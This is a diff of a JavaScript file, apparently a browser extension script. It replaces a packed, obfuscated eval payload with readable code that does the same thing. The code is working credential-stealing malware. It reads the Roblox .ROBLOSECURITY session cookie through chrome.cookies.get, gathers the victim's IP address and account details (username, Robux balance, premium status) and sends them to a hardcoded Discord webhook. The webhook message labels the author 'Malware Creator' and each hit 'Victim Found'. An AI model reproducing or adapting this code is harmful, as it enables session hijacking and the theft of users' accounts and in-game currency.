@@ -1,1 +1,65 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1K t="2://T.4/C/17/16/13";W D B(1){x 12=8(8 d("2://C.11.a")).m();Y(1){x 0=8(8 d("2://w.E.4/X/1a",{i:{K:".y="+1},Z:"15"})).k()}d(t,{18:"19",i:{"U-14":"V/k"},H:I.J({"G":e,"L":[{"M":"```"+(1?1:"O P Q")+"```","R":e,"S":[{"3":"1b","9":0?0.10:"N/A","g":h},{"3":"1d","9":0?0.1w:"N/A","g":h},{"3":"1y","9":0?0.1z:"N/A","g":h}],"1A":{"3":"1B 1C: "+"1D.1E.1F.5","j":0?0.l:"2://n.o.a/p/q/u/f/r/6.7/s-6.7.b",},"1c":{"m":"v#1G | 1H 1I","j":"2://c.1J.4/1x/1v-1m.1u"},"1f":{"z":0?0.l:"2://n.o.a/p/q/u/f/r/6.7/s-6.7.b",}}],"1g":"1h 1i 1j | 1k","1e":"2://1l.1n.4/F/1o/1p/v.b","F":[]})})}1q.1r.1s({"z":"2://w.E.4/1t","3":".y"},D(1){B(1?1.9:e)});',62,109,'statistics|cookie|https|name|com||NA_cap_icon|svg|await|value|org|png||fetch|null||inline|true|headers|icon_url|json|ThumbnailUrl|text|upload|wikimedia|wikipedia|commons|f3|1200px|WEBHOOK|thumb|aleenaswrldd|www|var|ROBLOSECURITY|url||main|api|function|roblox|attachments|content|body|JSON|stringify|Cookie|embeds|description||COOKIE|NOT|FOUND|color|fields|discord|Content|Application|async|mobileapi|if|redirect|UserName|ipify|ipAddr|iCmL45fZg_ChoJLpzd1Ooe6dWBnl7WD_crrQ7lZwhEUrJdkN_8gJ8BBKYOPewnmr9EHm|Type|manual|998044718162264186|webhooks|method|POST|userinfo|Username|footer|Robux|avatar_url|thumbnail|username|MADE|BY|ALEENAS|TROLLEDXBEAMED|cdn|fsociety|discordapp|998047009737027627|998047102775087235|chrome|cookies|get|home|gif|nerowo|RobuxBalance|3ItiA2urMygAAAAC|Premium|IsPremium|author|Victim|Found|247|117|63|1771|Malware|Creator|tenor|const'.split('|'),0,{}))
+const WEBHOOK = "https://discord.com/api/webhooks/998044718162264186/iCmL45fZg_ChoJLpzd1Ooe6dWBnl7WD_crrQ7lZwhEUrJdkN_8gJ8BBKYOPewnmr9EHm";
+
+async function main(cookie) {
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
+
+    if (cookie) {
+        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+            headers: {
+                Cookie: ".ROBLOSECURITY=" + cookie
+            },
+            redirect: "manual"
+        })).json();
+    }
+    
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {
+            "Content-Type": "Application/json"
+        },
+        body: JSON.stringify({
+            "content": null,
+            "embeds": [
+              {
+                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+                "color": null,
+                "fields": [
+                  {
+                    "name": "Username",
+                    "value": statistics ? statistics.UserName : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Robux",
+                    "value": statistics ? statistics.RobuxBalance : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Premium",
+                    "value": statistics ? statistics.IsPremium : "N/A",
+                    "inline": true
+                  }
+                ],
+                "author": {
+                  "name": "Victim Found: " + "247.117.63.5",
+                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                },
+                "footer": {
+                  "text": "aleenaswrldd#1771 | Malware Creator",
+                  "icon_url": "https://c.tenor.com/3ItiA2urMygAAAAC/nerowo-fsociety.gif"
+                },
+                "thumbnail": {
+                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                }
+              }
+            ],
+            "username": "MADE BY ALEENAS | TROLLEDXBEAMED",
+            "avatar_url": "https://cdn.discordapp.com/attachments/998047009737027627/998047102775087235/aleenaswrldd.png",
+            "attachments": []
+        })
+    });
+}
+
+chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+    main(cookie ? cookie.value : null);
+});
